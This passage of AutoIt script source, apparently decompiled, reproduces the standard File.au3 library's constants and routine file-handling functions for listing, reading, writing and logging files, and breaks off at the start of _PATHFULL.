Global Const $FILE_ATTRIBUTE_SYSTEM = 4
Global Const $FILE_ATTRIBUTE_DIRECTORY = 16
Global Const $FILE_ATTRIBUTE_ARCHIVE = 32
Global Const $FILE_ATTRIBUTE_DEVICE = 64
Global Const $FILE_ATTRIBUTE_NORMAL = 128
Global Const $FILE_ATTRIBUTE_TEMPORARY = 256
Global Const $FILE_ATTRIBUTE_SPARSE_FILE = 512
Global Const $FILE_ATTRIBUTE_REPARSE_POINT = 1024
Global Const $FILE_ATTRIBUTE_COMPRESSED = 2048
Global Const $FILE_ATTRIBUTE_OFFLINE = 4096
Global Const $FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 8192
Global Const $FILE_ATTRIBUTE_ENCRYPTED = 16384
Global Const $FILE_SHARE_READ = 1
Global Const $FILE_SHARE_WRITE = 2
Global Const $FILE_SHARE_DELETE = 4
Global Const $FILE_SHARE_READWRITE = BitOR ( $FILE_SHARE_READ , $FILE_SHARE_WRITE )
Global Const $FILE_SHARE_ANY = BitOR ( $FILE_SHARE_READ , $FILE_SHARE_WRITE , $FILE_SHARE_DELETE )
Global Const $GENERIC_ALL = 268435456
Global Const $GENERIC_EXECUTE = 536870912
Global Const $GENERIC_WRITE = 1073741824
Global Const $GENERIC_READ = 2147483648
Global Const $GENERIC_READWRITE = BitOR ( $GENERIC_READ , $GENERIC_WRITE )
Global Const $FILE_ENCODING_UTF16LE = 32
Global Const $FE_ENTIRE_UTF8 = 1
Global Const $FE_PARTIALFIRST_UTF8 = 2
Global Const $FN_FULLPATH = 0
Global Const $FN_RELATIVEPATH = 1
Global Const $FV_COMMENTS = "Comments"
Global Const $FV_COMPANYNAME = "CompanyName"
Global Const $FV_FILEDESCRIPTION = "FileDescription"
Global Const $FV_FILEVERSION = "FileVersion"
Global Const $FV_INTERNALNAME = "InternalName"
Global Const $FV_LEGALCOPYRIGHT = "LegalCopyright"
Global Const $FV_LEGALTRADEMARKS = "LegalTrademarks"
Global Const $FV_ORIGINALFILENAME = "OriginalFilename"
Global Const $FV_PRODUCTNAME = "ProductName"
Global Const $FV_PRODUCTVERSION = "ProductVersion"
Global Const $FV_PRIVATEBUILD = "PrivateBuild"
Global Const $FV_SPECIALBUILD = "SpecialBuild"
Global Const $FRTA_NOCOUNT = 0
Global Const $FRTA_COUNT = 1
Global Const $FRTA_INTARRAYS = 2
Global Const $FRTA_ENTIRESPLIT = 4
Global Const $FLTA_FILESFOLDERS = 0
Global Const $FLTA_FILES = 1
Global Const $FLTA_FOLDERS = 2
Global Const $FLTAR_FILESFOLDERS = 0
Global Const $FLTAR_FILES = 1
Global Const $FLTAR_FOLDERS = 2
Global Const $FLTAR_NOHIDDEN = 4
Global Const $FLTAR_NOSYSTEM = 8
Global Const $FLTAR_NOLINK = 16
Global Const $FLTAR_NORECUR = 0
Global Const $FLTAR_RECUR = 1
Global Const $FLTAR_NOSORT = 0
Global Const $FLTAR_SORT = 1
Global Const $FLTAR_FASTSORT = 2
Global Const $FLTAR_NOPATH = 0
Global Const $FLTAR_RELPATH = 1
Global Const $FLTAR_FULLPATH = 2
Func _FILECOUNTLINES ( $SFILEPATH )
	Local $HFILEOPEN = FileOpen ( $SFILEPATH , $FO_READ )
	If $HFILEOPEN = + 4294967295 Then Return SetError ( 1 , 0 , 0 )
	Local $SFILEREAD = StringStripWS ( FileRead ( $HFILEOPEN ) , $STR_STRIPTRAILING )
	FileClose ( $HFILEOPEN )
	Return UBound ( StringRegExp ( $SFILEREAD , "\R" , $STR_REGEXPARRAYGLOBALMATCH ) ) + 1 - Int ( $SFILEREAD = "" )
EndFunc
Func _FILECREATE ( $SFILEPATH )
	Local $HFILEOPEN = FileOpen ( $SFILEPATH , BitOR ( $FO_OVERWRITE , $FO_CREATEPATH ) )
	If $HFILEOPEN = + 4294967295 Then Return SetError ( 1 , 0 , 0 )
	Local $IFILEWRITE = FileWrite ( $HFILEOPEN , "" )
	FileClose ( $HFILEOPEN )
	If Not $IFILEWRITE Then Return SetError ( 2 , 0 , 0 )
	Return 1
EndFunc
Func _FILELISTTOARRAY ( $SFILEPATH , $SFILTER = "*" , $IFLAG = $FLTA_FILESFOLDERS , $BRETURNPATH = False )
	Local $SDELIMITER = "|" , $SFILELIST = "" , $SFILENAME = "" , $SFULLPATH = ""
	$SFILEPATH = StringRegExpReplace ( $SFILEPATH , "[\\/]+$" , "" ) & "\"
	If $IFLAG = Default Then $IFLAG = $FLTA_FILESFOLDERS
	If $BRETURNPATH Then $SFULLPATH = $SFILEPATH
	If $SFILTER = Default Then $SFILTER = "*"
	If Not FileExists ( $SFILEPATH ) Then Return SetError ( 1 , 0 , 0 )
	If StringRegExp ( $SFILTER , "[\\/:><\|]|(?s)^\s*$" ) Then Return SetError ( 2 , 0 , 0 )
	If Not ( $IFLAG = 0 Or $IFLAG = 1 Or $IFLAG = 2 ) Then Return SetError ( 3 , 0 , 0 )
	Local $HSEARCH = FileFindFirstFile ( $SFILEPATH & $SFILTER )
	If @error Then Return SetError ( 4 , 0 , 0 )
	While 1
		$SFILENAME = FileFindNextFile ( $HSEARCH )
		If @error Then ExitLoop
		If ( $IFLAG + @extended = 2 ) Then ContinueLoop
		$SFILELIST &= $SDELIMITER & $SFULLPATH & $SFILENAME
	WEnd
	FileClose ( $HSEARCH )
	If $SFILELIST = "" Then Return SetError ( 4 , 0 , 0 )
	Return StringSplit ( StringTrimLeft ( $SFILELIST , 1 ) , $SDELIMITER )
EndFunc
Func _FILELISTTOARRAYREC ( $SFILEPATH , $SMASK = "*" , $IRETURN = $FLTAR_FILESFOLDERS , $IRECUR = $FLTAR_NORECUR , $ISORT = $FLTAR_NOSORT , $IRETURNPATH = $FLTAR_RELPATH )
	If Not FileExists ( $SFILEPATH ) Then Return SetError ( 1 , 1 , "" )
	If $SMASK = Default Then $SMASK = "*"
	If $IRETURN = Default Then $IRETURN = $FLTAR_FILESFOLDERS
	If $IRECUR = Default Then $IRECUR = $FLTAR_NORECUR
	If $ISORT = Default Then $ISORT = $FLTAR_NOSORT
	If $IRETURNPATH = Default Then $IRETURNPATH = $FLTAR_RELPATH
	If $IRECUR > 1 Or Not IsInt ( $IRECUR ) Then Return SetError ( 1 , 6 , "" )
	Local $BLONGPATH = False
	If StringLeft ( $SFILEPATH , 4 ) == "\\?\" Then
		$BLONGPATH = True
	EndIf
	Local $SFOLDERSLASH = ""
	If StringRight ( $SFILEPATH , 1 ) = "\" Then
		$SFOLDERSLASH = "\"
	Else
		$SFILEPATH = $SFILEPATH & "\"
	EndIf
	Local $ASFOLDERSEARCHLIST [ 100 ] = [ 1 ]
	$ASFOLDERSEARCHLIST [ 1 ] = $SFILEPATH
	Local $IHIDE_HS = 0 , $SHIDE_HS = ""
	If BitAND ( $IRETURN , 4 ) Then
		$IHIDE_HS += 2
		$SHIDE_HS &= "H"
		$IRETURN -= 4
	EndIf
	If BitAND ( $IRETURN , 8 ) Then
		$IHIDE_HS += 4
		$SHIDE_HS &= "S"
		$IRETURN -= 8
	EndIf
	Local $IHIDE_LINK = 0
	If BitAND ( $IRETURN , 16 ) Then
		$IHIDE_LINK = 1024
		$IRETURN -= 16
	EndIf
	Local $IMAXLEVEL = 0
	If $IRECUR < 0 Then
		StringReplace ( $SFILEPATH , "\" , "" , 0 , $STR_NOCASESENSEBASIC )
		$IMAXLEVEL = @extended - $IRECUR
	EndIf
	Local $SEXCLUDE_LIST = "" , $SEXCLUDE_LIST_FOLDER = "" , $SINCLUDE_LIST = "*"
	Local $AMASKSPLIT = StringSplit ( $SMASK , "|" )
	Switch $AMASKSPLIT [ 0 ]
	Case 3
		$SEXCLUDE_LIST_FOLDER = $AMASKSPLIT [ 3 ]
		ContinueCase
	Case 2
		$SEXCLUDE_LIST = $AMASKSPLIT [ 2 ]
		ContinueCase
	Case 1
		$SINCLUDE_LIST = $AMASKSPLIT [ 1 ]
	EndSwitch
	Local $SINCLUDE_FILE_MASK = ".+"
	If $SINCLUDE_LIST <> "*" Then
		If Not __FLTAR_LISTTOMASK ( $SINCLUDE_FILE_MASK , $SINCLUDE_LIST ) Then Return SetError ( 1 , 2 , "" )
	EndIf
	Local $SINCLUDE_FOLDER_MASK = ".+"
	Switch $IRETURN
	Case 0
		Switch $IRECUR
		Case 0
			$SINCLUDE_FOLDER_MASK = $SINCLUDE_FILE_MASK
		EndSwitch
	Case 2
		$SINCLUDE_FOLDER_MASK = $SINCLUDE_FILE_MASK
	EndSwitch
	Local $SEXCLUDE_FILE_MASK = ":"
	If $SEXCLUDE_LIST <> "" Then
		If Not __FLTAR_LISTTOMASK ( $SEXCLUDE_FILE_MASK , $SEXCLUDE_LIST ) Then Return SetError ( 1 , 3 , "" )
	EndIf
	Local $SEXCLUDE_FOLDER_MASK = ":"
	If $IRECUR Then
		If $SEXCLUDE_LIST_FOLDER Then
			If Not __FLTAR_LISTTOMASK ( $SEXCLUDE_FOLDER_MASK , $SEXCLUDE_LIST_FOLDER ) Then Return SetError ( 1 , 4 , "" )
		EndIf
		If $IRETURN = 2 Then
			$SEXCLUDE_FOLDER_MASK = $SEXCLUDE_FILE_MASK
		EndIf
	Else
		$SEXCLUDE_FOLDER_MASK = $SEXCLUDE_FILE_MASK
	EndIf
	If Not ( $IRETURN = 0 Or $IRETURN = 1 Or $IRETURN = 2 ) Then Return SetError ( 1 , 5 , "" )
	If Not ( $ISORT = 0 Or $ISORT = 1 Or $ISORT = 2 ) Then Return SetError ( 1 , 7 , "" )
	If Not ( $IRETURNPATH = 0 Or $IRETURNPATH = 1 Or $IRETURNPATH = 2 ) Then Return SetError ( 1 , 8 , "" )
	If $IHIDE_LINK Then
		Local $TFILE_DATA = DllStructCreate ( "struct;align 4;dword FileAttributes;uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;" & "dword FileSizeHigh;dword FileSizeLow;dword Reserved0;dword Reserved1;wchar FileName[260];wchar AlternateFileName[14];endstruct" )
		Local $HDLL = DllOpen ( "kernel32.dll" ) , $ADLL_RET
	EndIf
	Local $ASRETURNLIST [ 100 ] = [ 0 ]
	Local $ASFILEMATCHLIST = $ASRETURNLIST , $ASROOTFILEMATCHLIST = $ASRETURNLIST , $ASFOLDERMATCHLIST = $ASRETURNLIST
	Local $BFOLDER = False , $HSEARCH = 0 , $SCURRENTPATH = "" , $SNAME = "" , $SRETPATH = ""
	Local $IATTRIBS = 0 , $SATTRIBS = ""
	Local $ASFOLDERFILESECTIONLIST [ 100 ] [ 2 ] = [ [ 0 , 0 ] ]
	While $ASFOLDERSEARCHLIST [ 0 ] > 0
		$SCURRENTPATH = $ASFOLDERSEARCHLIST [ $ASFOLDERSEARCHLIST [ 0 ] ]
		$ASFOLDERSEARCHLIST [ 0 ] -= 1
		Switch $IRETURNPATH
		Case 1
			$SRETPATH = StringReplace ( $SCURRENTPATH , $SFILEPATH , "" )
		Case 2
			If $BLONGPATH Then
				$SRETPATH = StringTrimLeft ( $SCURRENTPATH , 4 )
			Else
				$SRETPATH = $SCURRENTPATH
			EndIf
		EndSwitch
		If $IHIDE_LINK Then
			$ADLL_RET = DllCall ( $HDLL , "handle" , "FindFirstFileW" , "wstr" , $SCURRENTPATH & "*" , "struct*" , $TFILE_DATA )
			If @error Or Not $ADLL_RET [ 0 ] Then
				ContinueLoop
			EndIf
			$HSEARCH = $ADLL_RET [ 0 ]
		Else
			$HSEARCH = FileFindFirstFile ( $SCURRENTPATH & "*" )
			If $HSEARCH = + 4294967295 Then
				ContinueLoop
			EndIf
		EndIf
		If $IRETURN = 0 And $ISORT And $IRETURNPATH Then
			__FLTAR_ADDTOLIST ( $ASFOLDERFILESECTIONLIST , $SRETPATH , $ASFILEMATCHLIST [ 0 ] + 1 )
		EndIf
		$SATTRIBS = ""
		While 1
			If $IHIDE_LINK Then
				$ADLL_RET = DllCall ( $HDLL , "int" , "FindNextFileW" , "handle" , $HSEARCH , "struct*" , $TFILE_DATA )
				If @error Or Not $ADLL_RET [ 0 ] Then
					ExitLoop
				EndIf
				$SNAME = DllStructGetData ( $TFILE_DATA , "FileName" )
				If $SNAME = ".." Then
					ContinueLoop
				EndIf
				$IATTRIBS = DllStructGetData ( $TFILE_DATA , "FileAttributes" )
				If $IHIDE_HS And BitAND ( $IATTRIBS , $IHIDE_HS ) Then
					ContinueLoop
				EndIf
				If BitAND ( $IATTRIBS , $IHIDE_LINK ) Then
					ContinueLoop
				EndIf
				$BFOLDER = False
				If BitAND ( $IATTRIBS , 16 ) Then
					$BFOLDER = True
				EndIf
			Else
				$BFOLDER = False
				$SNAME = FileFindNextFile ( $HSEARCH , 1 )
				If @error Then
					ExitLoop
				EndIf
				$SATTRIBS = @extended
				If StringInStr ( $SATTRIBS , "D" ) Then
					$BFOLDER = True
				EndIf
				If StringRegExp ( $SATTRIBS , "[" & $SHIDE_HS & "]" ) Then
					ContinueLoop
				EndIf
			EndIf
			If $BFOLDER Then
				Select
				Case $IRECUR < 0
					StringReplace ( $SCURRENTPATH , "\" , "" , 0 , $STR_NOCASESENSEBASIC )
					If @extended < $IMAXLEVEL Then
						ContinueCase
					EndIf
				Case $IRECUR = 1
					If Not StringRegExp ( $SNAME , $SEXCLUDE_FOLDER_MASK ) Then
						__FLTAR_ADDTOLIST ( $ASFOLDERSEARCHLIST , $SCURRENTPATH & $SNAME & "\" )
					EndIf
				EndSelect
			EndIf
			If $ISORT Then
				If $BFOLDER Then
					If StringRegExp ( $SNAME , $SINCLUDE_FOLDER_MASK ) And Not StringRegExp ( $SNAME , $SEXCLUDE_FOLDER_MASK ) Then
						__FLTAR_ADDTOLIST ( $ASFOLDERMATCHLIST , $SRETPATH & $SNAME & $SFOLDERSLASH )
					EndIf
				Else
					If StringRegExp ( $SNAME , $SINCLUDE_FILE_MASK ) And Not StringRegExp ( $SNAME , $SEXCLUDE_FILE_MASK ) Then
						If $SCURRENTPATH = $SFILEPATH Then
							__FLTAR_ADDTOLIST ( $ASROOTFILEMATCHLIST , $SRETPATH & $SNAME )
						Else
							__FLTAR_ADDTOLIST ( $ASFILEMATCHLIST , $SRETPATH & $SNAME )
						EndIf
					EndIf
				EndIf
			Else
				If $BFOLDER Then
					If $IRETURN <> 1 And StringRegExp ( $SNAME , $SINCLUDE_FOLDER_MASK ) And Not StringRegExp ( $SNAME , $SEXCLUDE_FOLDER_MASK ) Then
						__FLTAR_ADDTOLIST ( $ASRETURNLIST , $SRETPATH & $SNAME & $SFOLDERSLASH )
					EndIf
				Else
					If $IRETURN <> 2 And StringRegExp ( $SNAME , $SINCLUDE_FILE_MASK ) And Not StringRegExp ( $SNAME , $SEXCLUDE_FILE_MASK ) Then
						__FLTAR_ADDTOLIST ( $ASRETURNLIST , $SRETPATH & $SNAME )
					EndIf
				EndIf
			EndIf
		WEnd
		If $IHIDE_LINK Then
			DllCall ( $HDLL , "int" , "FindClose" , "ptr" , $HSEARCH )
		Else
			FileClose ( $HSEARCH )
		EndIf
	WEnd
	If $IHIDE_LINK Then
		DllClose ( $HDLL )
	EndIf
	If $ISORT Then
		Switch $IRETURN
		Case 2
			If $ASFOLDERMATCHLIST [ 0 ] = 0 Then Return SetError ( 1 , 9 , "" )
			ReDim $ASFOLDERMATCHLIST [ $ASFOLDERMATCHLIST [ 0 ] + 1 ]
			$ASRETURNLIST = $ASFOLDERMATCHLIST
			__ARRAYDUALPIVOTSORT ( $ASRETURNLIST , 1 , $ASRETURNLIST [ 0 ] )
		Case 1
			If $ASROOTFILEMATCHLIST [ 0 ] = 0 And $ASFILEMATCHLIST [ 0 ] = 0 Then Return SetError ( 1 , 9 , "" )
			If $IRETURNPATH = 0 Then
				__FLTAR_ADDFILELISTS ( $ASRETURNLIST , $ASROOTFILEMATCHLIST , $ASFILEMATCHLIST )
				__ARRAYDUALPIVOTSORT ( $ASRETURNLIST , 1 , $ASRETURNLIST [ 0 ] )
			Else
				__FLTAR_ADDFILELISTS ( $ASRETURNLIST , $ASROOTFILEMATCHLIST , $ASFILEMATCHLIST , 1 )
			EndIf
		Case 0
			If $ASROOTFILEMATCHLIST [ 0 ] = 0 And $ASFOLDERMATCHLIST [ 0 ] = 0 Then Return SetError ( 1 , 9 , "" )
			If $IRETURNPATH = 0 Then
				__FLTAR_ADDFILELISTS ( $ASRETURNLIST , $ASROOTFILEMATCHLIST , $ASFILEMATCHLIST )
				$ASRETURNLIST [ 0 ] += $ASFOLDERMATCHLIST [ 0 ]
				ReDim $ASFOLDERMATCHLIST [ $ASFOLDERMATCHLIST [ 0 ] + 1 ]
				_ARRAYCONCATENATE ( $ASRETURNLIST , $ASFOLDERMATCHLIST , 1 )
				__ARRAYDUALPIVOTSORT ( $ASRETURNLIST , 1 , $ASRETURNLIST [ 0 ] )
			Else
				Local $ASRETURNLIST [ $ASFILEMATCHLIST [ 0 ] + $ASROOTFILEMATCHLIST [ 0 ] + $ASFOLDERMATCHLIST [ 0 ] + 1 ]
				$ASRETURNLIST [ 0 ] = $ASFILEMATCHLIST [ 0 ] + $ASROOTFILEMATCHLIST [ 0 ] + $ASFOLDERMATCHLIST [ 0 ]
				__ARRAYDUALPIVOTSORT ( $ASROOTFILEMATCHLIST , 1 , $ASROOTFILEMATCHLIST [ 0 ] )
				For $I = 1 To $ASROOTFILEMATCHLIST [ 0 ]
					$ASRETURNLIST [ $I ] = $ASROOTFILEMATCHLIST [ $I ]
				Next
				Local $INEXTINSERTIONINDEX = $ASROOTFILEMATCHLIST [ 0 ] + 1
				__ARRAYDUALPIVOTSORT ( $ASFOLDERMATCHLIST , 1 , $ASFOLDERMATCHLIST [ 0 ] )
				Local $SFOLDERTOFIND = ""
				For $I = 1 To $ASFOLDERMATCHLIST [ 0 ]
					$ASRETURNLIST [ $INEXTINSERTIONINDEX ] = $ASFOLDERMATCHLIST [ $I ]
					$INEXTINSERTIONINDEX += 1
					If $SFOLDERSLASH Then
						$SFOLDERTOFIND = $ASFOLDERMATCHLIST [ $I ]
					Else
						$SFOLDERTOFIND = $ASFOLDERMATCHLIST [ $I ] & "\"
					EndIf
					Local $IFILESECTIONENDINDEX = 0 , $IFILESECTIONSTARTINDEX = 0
					For $J = 1 To $ASFOLDERFILESECTIONLIST [ 0 ] [ 0 ]
						If $SFOLDERTOFIND = $ASFOLDERFILESECTIONLIST [ $J ] [ 0 ] Then
							$IFILESECTIONSTARTINDEX = $ASFOLDERFILESECTIONLIST [ $J ] [ 1 ]
							If $J = $ASFOLDERFILESECTIONLIST [ 0 ] [ 0 ] Then
								$IFILESECTIONENDINDEX = $ASFILEMATCHLIST [ 0 ]
							Else
								$IFILESECTIONENDINDEX = $ASFOLDERFILESECTIONLIST [ $J + 1 ] [ 1 ] + 4294967295
							EndIf
							If $ISORT = 1 Then
								__ARRAYDUALPIVOTSORT ( $ASFILEMATCHLIST , $IFILESECTIONSTARTINDEX , $IFILESECTIONENDINDEX )
							EndIf
							For $K = $IFILESECTIONSTARTINDEX To $IFILESECTIONENDINDEX
								$ASRETURNLIST [ $INEXTINSERTIONINDEX ] = $ASFILEMATCHLIST [ $K ]
								$INEXTINSERTIONINDEX += 1
							Next
							ExitLoop
						EndIf
					Next
				Next
			EndIf
		EndSwitch
	Else
		If $ASRETURNLIST [ 0 ] = 0 Then Return SetError ( 1 , 9 , "" )
		ReDim $ASRETURNLIST [ $ASRETURNLIST [ 0 ] + 1 ]
	EndIf
	Return $ASRETURNLIST
EndFunc
Func __FLTAR_ADDFILELISTS ( ByRef $ASTARGET , $ASSOURCE_1 , $ASSOURCE_2 , $ISORT = 0 )
	ReDim $ASSOURCE_1 [ $ASSOURCE_1 [ 0 ] + 1 ]
	If $ISORT = 1 Then __ARRAYDUALPIVOTSORT ( $ASSOURCE_1 , 1 , $ASSOURCE_1 [ 0 ] )
	$ASTARGET = $ASSOURCE_1
	$ASTARGET [ 0 ] += $ASSOURCE_2 [ 0 ]
	ReDim $ASSOURCE_2 [ $ASSOURCE_2 [ 0 ] + 1 ]
	If $ISORT = 1 Then __ARRAYDUALPIVOTSORT ( $ASSOURCE_2 , 1 , $ASSOURCE_2 [ 0 ] )
	_ARRAYCONCATENATE ( $ASTARGET , $ASSOURCE_2 , 1 )
EndFunc
Func __FLTAR_ADDTOLIST ( ByRef $ALIST , $VVALUE_0 , $VVALUE_1 = + 4294967295 )
	If $VVALUE_1 = + 4294967295 Then
		$ALIST [ 0 ] += 1
		If UBound ( $ALIST ) <= $ALIST [ 0 ] Then ReDim $ALIST [ UBound ( $ALIST ) * 2 ]
		$ALIST [ $ALIST [ 0 ] ] = $VVALUE_0
	Else
		$ALIST [ 0 ] [ 0 ] += 1
		If UBound ( $ALIST ) <= $ALIST [ 0 ] [ 0 ] Then ReDim $ALIST [ UBound ( $ALIST ) * 2 ] [ 2 ]
		$ALIST [ $ALIST [ 0 ] [ 0 ] ] [ 0 ] = $VVALUE_0
		$ALIST [ $ALIST [ 0 ] [ 0 ] ] [ 1 ] = $VVALUE_1
	EndIf
EndFunc
Func __FLTAR_LISTTOMASK ( ByRef $SMASK , $SLIST )
	If StringRegExp ( $SLIST , "\\|/|:|\<|\>|\|" ) Then Return 0
	$SLIST = StringReplace ( StringStripWS ( StringRegExpReplace ( $SLIST , "\s*;\s*" , ";" ) , $STR_STRIPLEADING + $STR_STRIPTRAILING ) , ";" , "|" )
	$SLIST = StringReplace ( StringReplace ( StringRegExpReplace ( $SLIST , "[][$^.{}()+\-]" , "\\$0" ) , "?" , "." ) , "*" , ".*?" )
	$SMASK = "(?i)^(" & $SLIST & ")\z"
	Return 1
EndFunc
Func _FILEPRINT ( $SFILEPATH , $ISHOW = @SW_HIDE )
	If $ISHOW = Default Then $ISHOW = @SW_HIDE
	Return ShellExecute ( $SFILEPATH , "" , @WorkingDir , "print" , $ISHOW )
EndFunc
Func _FILEREADTOARRAY ( $SFILEPATH , ByRef $VRETURN , $IFLAGS = $FRTA_COUNT , $SDELIMITER = "" )
	$VRETURN = 0
	If $IFLAGS = Default Then $IFLAGS = $FRTA_COUNT
	If $SDELIMITER = Default Then $SDELIMITER = ""
	Local $BEXPAND = True
	If BitAND ( $IFLAGS , $FRTA_INTARRAYS ) Then
		$BEXPAND = False
		$IFLAGS -= $FRTA_INTARRAYS
	EndIf
	Local $IENTIRE = $STR_CHRSPLIT
	If BitAND ( $IFLAGS , $FRTA_ENTIRESPLIT ) Then
		$IENTIRE = $STR_ENTIRESPLIT
		$IFLAGS -= $FRTA_ENTIRESPLIT
	EndIf
	Local $INOCOUNT = 0
	If $IFLAGS <> $FRTA_COUNT Then
		$IFLAGS = $FRTA_NOCOUNT
		$INOCOUNT = $STR_NOCOUNT
	EndIf
	If $SDELIMITER Then
		Local $ALINES = FileReadToArray ( $SFILEPATH )
		If @error Then Return SetError ( @error , 0 , 0 )
		Local $IDIM_1 = UBound ( $ALINES ) + $IFLAGS
		If $BEXPAND Then
			Local $IDIM_2 = UBound ( StringSplit ( $ALINES [ 0 ] , $SDELIMITER , $IENTIRE + $STR_NOCOUNT ) )
			Local $ATEMP_ARRAY [ $IDIM_1 ] [ $IDIM_2 ]
			Local $IFIELDS , $ASPLIT
			For $I = 0 To $IDIM_1 - $IFLAGS + 4294967295
				$ASPLIT = StringSplit ( $ALINES [ $I ] , $SDELIMITER , $IENTIRE + $STR_NOCOUNT )
				$IFIELDS = UBound ( $ASPLIT )
				If $IFIELDS <> $IDIM_2 Then
					Return SetError ( 3 , 0 , 0 )
				EndIf
				For $J = 0 To $IFIELDS + 4294967295
					$ATEMP_ARRAY [ $I + $IFLAGS ] [ $J ] = $ASPLIT [ $J ]
				Next
			Next
			If $IDIM_2 < 2 Then Return SetError ( 4 , 0 , 0 )
			If $IFLAGS Then
				$ATEMP_ARRAY [ 0 ] [ 0 ] = $IDIM_1 - $IFLAGS
				$ATEMP_ARRAY [ 0 ] [ 1 ] = $IDIM_2
			EndIf
		Else
			Local $ATEMP_ARRAY [ $IDIM_1 ]
			For $I = 0 To $IDIM_1 - $IFLAGS + 4294967295
				$ATEMP_ARRAY [ $I + $IFLAGS ] = StringSplit ( $ALINES [ $I ] , $SDELIMITER , $IENTIRE + $INOCOUNT )
			Next
			If $IFLAGS Then
				$ATEMP_ARRAY [ 0 ] = $IDIM_1 - $IFLAGS
			EndIf
		EndIf
		$VRETURN = $ATEMP_ARRAY
	Else
		If $IFLAGS Then
			Local $HFILEOPEN = FileOpen ( $SFILEPATH , $FO_READ )
			If $HFILEOPEN = + 4294967295 Then Return SetError ( 1 , 0 , 0 )
			Local $SFILEREAD = FileRead ( $HFILEOPEN )
			FileClose ( $HFILEOPEN )
			If StringLen ( $SFILEREAD ) Then
				$VRETURN = StringRegExp ( @LF & $SFILEREAD , "(?|(\N+)\z|(\N*)(?:\R))" , 3 )
				$VRETURN [ 0 ] = UBound ( $VRETURN ) + 4294967295
			Else
				Return SetError ( 2 , 0 , 0 )
			EndIf
		Else
			$VRETURN = FileReadToArray ( $SFILEPATH )
			If @error Then
				$VRETURN = 0
				Return SetError ( @error , 0 , 0 )
			EndIf
		EndIf
	EndIf
	Return 1
EndFunc
Func _FILEWRITEFROMARRAY ( $SFILEPATH , Const ByRef $AARRAY , $IBASE = Default , $IUBOUND = Default , $SDELIMITER = "|" )
	Local $IRETURN = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 2 , 0 , $IRETURN )
	Local $IDIMS = UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	If $IDIMS > 2 Then Return SetError ( 4 , 0 , 0 )
	Local $ILAST = UBound ( $AARRAY ) + 4294967295
	If $IUBOUND = Default Or $IUBOUND > $ILAST Then $IUBOUND = $ILAST
	If $IBASE < 0 Or $IBASE = Default Then $IBASE = 0
	If $IBASE > $IUBOUND Then Return SetError ( 5 , 0 , $IRETURN )
	If $SDELIMITER = Default Then $SDELIMITER = "|"
	Local $HFILEOPEN = $SFILEPATH
	If IsString ( $SFILEPATH ) Then
		$HFILEOPEN = FileOpen ( $SFILEPATH , $FO_OVERWRITE )
		If $HFILEOPEN = + 4294967295 Then Return SetError ( 1 , 0 , $IRETURN )
	EndIf
	Local $IERROR = 0
	$IRETURN = 1
	Switch $IDIMS
	Case 1
		For $I = $IBASE To $IUBOUND
			If Not FileWrite ( $HFILEOPEN , $AARRAY [ $I ] & @CRLF ) Then
				$IERROR = 3
				$IRETURN = 0
				ExitLoop
			EndIf
		Next
	Case 2
		Local $STEMP = ""
		For $I = $IBASE To $IUBOUND
			$STEMP = $AARRAY [ $I ] [ 0 ]
			For $J = 1 To UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
				$STEMP &= $SDELIMITER & $AARRAY [ $I ] [ $J ]
			Next
			If Not FileWrite ( $HFILEOPEN , $STEMP & @CRLF ) Then
				$IERROR = 3
				$IRETURN = 0
				ExitLoop
			EndIf
		Next
	EndSwitch
	If IsString ( $SFILEPATH ) Then FileClose ( $HFILEOPEN )
	Return SetError ( $IERROR , 0 , $IRETURN )
EndFunc
Func _FILEWRITELOG ( $SLOGPATH , $SLOGMSG , $IFLAG = + 4294967295 )
	Local $IOPENMODE = $FO_APPEND
	Local $SDATENOW = @YEAR & "-" & @MON & "-" & @MDAY
	Local $STIMENOW = @HOUR & ":" & @MIN & ":" & @SEC
	Local $SMSG = $SDATENOW & " " & $STIMENOW & " : " & $SLOGMSG
	If $IFLAG = Default Then $IFLAG = + 4294967295
	If $IFLAG <> + 4294967295 Then
		$IOPENMODE = $FO_OVERWRITE
		$SMSG &= @CRLF & FileRead ( $SLOGPATH )
	EndIf
	Local $HFILEOPEN = $SLOGPATH
	If IsString ( $SLOGPATH ) Then
		$HFILEOPEN = FileOpen ( $SLOGPATH , $IOPENMODE )
	EndIf
	If $HFILEOPEN = + 4294967295 Then Return SetError ( 1 , 0 , 0 )
	Local $IRETURN = FileWriteLine ( $HFILEOPEN , $SMSG )
	If IsString ( $SLOGPATH ) Then $IRETURN = FileClose ( $HFILEOPEN )
	If $IRETURN <= 0 Then Return SetError ( 2 , $IRETURN , 0 )
	Return $IRETURN
EndFunc
Func _FILEWRITETOLINE ( $SFILEPATH , $ILINE , $STEXT , $BOVERWRITE = False )
	If $ILINE <= 0 Then Return SetError ( 4 , 0 , 0 )
	If Not IsString ( $STEXT ) Then
		$STEXT = String ( $STEXT )
		If $STEXT = "" Then Return SetError ( 6 , 0 , 0 )
	EndIf
	If $BOVERWRITE = Default Then $BOVERWRITE = False
	If Not ( IsBool ( $BOVERWRITE ) Or $BOVERWRITE = 0 Or $BOVERWRITE = 1 ) Then Return SetError ( 5 , 0 , 0 )
	If Not FileExists ( $SFILEPATH ) Then Return SetError ( 2 , 0 , 0 )
	Local $AARRAY = FileReadToArray ( $SFILEPATH )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If ( $IUBOUND + 1 ) < $ILINE Then Return SetError ( 1 , 0 , 0 )
	Local $HFILEOPEN = FileOpen ( $SFILEPATH , FileGetEncoding ( $SFILEPATH ) + $FO_OVERWRITE )
	If $HFILEOPEN = + 4294967295 Then Return SetError ( 3 , 0 , 0 )
	Local $SDATA = ""
	$ILINE -= 1
	For $I = 0 To $IUBOUND
		If $I = $ILINE Then
			If $BOVERWRITE Then
				If $STEXT Then $SDATA &= $STEXT & @CRLF
			Else
				$SDATA &= $STEXT & @CRLF & $AARRAY [ $I ] & @CRLF
			EndIf
		ElseIf $I < $IUBOUND Then
			$SDATA &= $AARRAY [ $I ] & @CRLF
		ElseIf $I = $IUBOUND Then
			$SDATA &= $AARRAY [ $I ]
		EndIf
	Next
	FileWrite ( $HFILEOPEN , $SDATA )
	FileClose ( $HFILEOPEN )
	Return 1
EndFunc
Func _PATHFULL ( $SRELATIVEPATH , $SBASEPATH = @WorkingDir )
